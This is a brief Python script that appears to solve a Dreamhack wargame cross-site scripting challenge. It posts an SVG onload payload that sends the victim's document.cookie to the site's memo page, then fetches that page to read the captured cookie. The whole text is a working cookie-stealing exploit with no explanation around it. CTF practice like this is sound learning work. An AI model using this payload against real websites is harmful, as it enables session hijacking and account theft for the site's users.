import requests

port = 20530
url_index = f'http://host1.dreamhack.games:{port}/'
url_flag = url_index + 'flag'
url_memo = url_index + 'memo'
param = {'param' : '<svg onload = \"location.href=\'/memo?memo=\' + document.cookie\">'}
requests.post(url_flag, data = param)
response = requests.get(url_memo)
print(response.text)